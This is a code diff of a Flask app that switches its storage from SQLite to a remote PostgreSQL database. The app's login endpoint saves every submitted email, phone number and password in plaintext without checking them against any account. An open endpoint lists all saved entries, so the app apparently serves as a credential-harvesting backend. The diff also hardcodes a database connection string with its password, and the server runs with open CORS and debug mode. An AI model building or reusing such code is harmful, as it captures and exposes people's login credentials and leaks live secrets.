@@ -1,22 +1,30 @@
 from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
-import sqlite3
+import psycopg2
+import psycopg2.extras
 import os
 from datetime import datetime
 
 app = Flask(__name__, static_folder='static')
 CORS(app)
 
-DB_PATH = os.path.join(os.path.dirname(__file__), 'users.db')
+# Neon PostgreSQL connection string
+DATABASE_URL = 'postgresql://neondb_owner:npg_N8IkVA9ZGpdm@ep-steep-waterfall-atza8yzw-pooler.c-9.us-east-1.aws.neon.tech/neondb?sslmode=require'
+
+
+def get_db():
+    """Get a connection to the Neon PostgreSQL database."""
+    conn = psycopg2.connect(DATABASE_URL)
+    return conn
 
 
 def init_db():
-    """Initialize the SQLite database and create the users table."""
-    conn = sqlite3.connect(DB_PATH)
+    """Initialize the Neon database and create the users table."""
+    conn = get_db()
     cursor = conn.cursor()
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            id SERIAL PRIMARY KEY,
             login_type TEXT NOT NULL,
             email TEXT,
             phone_number TEXT,
@@ -37,7 +45,7 @@ def index():
 
 @app.route('/api/login', methods=['POST'])
 def login():
-    """Handle login form submission and save details to the database."""
+    """Handle login form submission and save details to the Neon database."""
     data = request.get_json()
 
     login_type = data.get('login_type', 'email')
@@ -57,11 +65,11 @@ def login():
         return jsonify({'success': False, 'message': 'Phone number is required'}), 400
 
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = get_db()
         cursor = conn.cursor()
         cursor.execute('''
             INSERT INTO users (login_type, email, phone_number, password, remember_password, created_at)
-            VALUES (?, ?, ?, ?, ?, ?)
+            VALUES (%s, %s, %s, %s, %s, %s)
         ''', (login_type, email, phone_number, password, remember_password, created_at))
         conn.commit()
         conn.close()
@@ -75,9 +83,8 @@ def login():
 def get_users():
     """Retrieve all saved login entries (for admin/debugging)."""
     try:
-        conn = sqlite3.connect(DB_PATH)
-        conn.row_factory = sqlite3.Row
-        cursor = conn.cursor()
+        conn = get_db()
+        cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
         cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
         rows = cursor.fetchall()
         conn.close()
@@ -90,6 +97,6 @@ def get_users():
 
 if __name__ == '__main__':
     init_db()
-    print('Database initialized.')
+    print('Neon database initialized.')
     print('Server running at http://localhost:5000')
     app.run(debug=True, host='0.0.0.0', port=5000)
